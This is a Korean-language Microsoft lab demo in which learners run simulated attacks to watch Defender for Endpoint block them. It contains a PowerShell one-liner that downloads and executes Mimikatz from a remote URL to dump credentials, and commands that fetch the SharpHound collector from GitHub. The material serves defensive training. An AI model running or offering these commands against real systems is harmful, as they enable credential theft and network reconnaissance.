# 모듈 2 데모 - 엔드포인트용 Microsoft Defender를 사용하여 위협 완화

**참고** 이 데모의 성공적인 완료는 필수 구성 요소 문서의[ 모든 단계를 ](00-prerequisites.md)완료하는 데 따라 달라집니다.

## 시뮬레이션된 공격

이 작업에서는 두 개의 시뮬레이션된 공격을 실행하여 엔드포인트용 Microsoft Defender 기능을 탐색합니다.

1. 브라우저의 Microsoft Defender XDR 포털에 아직 없는 경우 테넌트에 대한 관리 로그인한 Microsofthttps://security.microsoft.com) Defender XDR로 이동합니다.

WIN1에서 *PowerShell**을 사용하여 *시뮬레이션된* 공격을 실행하여 엔드포인트용 Microsoft Defender 기능을 탐색*합니다.

`Attack 1: Mimikatz - Credential Dumping`

1. WIN1 컴퓨터의 *검색 창에 명령을** 입력**하고 관리자** 권한으로 실행을 선택합니다**.*

1. 다음 명령을 복사하여 관리istrator: 명령 프롬프트 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Access가 *거부되었다는* 메시지와 위협을 표시하는 *팝업 메시지가 `Microsoft Defender Antivirus, Windows Security Virus and threats protection` 표시됩니다*.

1. 종료를 **입력**하고 Enter 키를 눌러 **관리istrator: 명령 프롬프트** 창을 종료**합니다**.

`Attack 2: Bloodhound - Collection`

1. WIN1 컴퓨터의 *검색 창에 PowerShell**을 입력**하고 Windows PowerShell**을 선택한 **다음 관리자** 권한으로 실행을 선택합니다**.*

1. 다음 명령을 복사하여 관리istrator: Windows PowerShell 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**참고:** 명령을 한 번에 하나씩 복사, 붙여넣기 및 실행하는 것이 좋습니다. 메모장* 열고 *명령을 임시 파일에 복사하여 이 작업을 수행할 수 있습니다. 첫 번째 명령은 Atomic Red Team* 폴더가 있는 동일한 폴더에 ExternalPayloads*라는 *폴더를 *만듭니다. 두 번째 명령은 BloodHound GitHub 리포지토리에서 *SharpHound.ps1** 파일을 다운로드*하고 ExternalPayloads 폴더에 *저장합니다*.

1. 발견된 위협이* 표시되면 팝업 메시지가 `Windows Security Virus and threats protection` 표시됩니다*.

1. 다음 명령을 복사하여 관리istrator: Windows PowerShell 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. 출력이 True*이*면 Microsoft Defender 바이러스 백신 맬웨어 페이로드 파일이 제거되지 않았습니다. 출력이 False*이*면 Microsoft Defender 바이러스 백신 맬웨어 페이로드 파일이 제거되었습니다. 위쪽 화살표 키를 사용하여 출력이 False*가 *될 때까지 명령을 반복합니다.

## 데모를 완료했습니다.
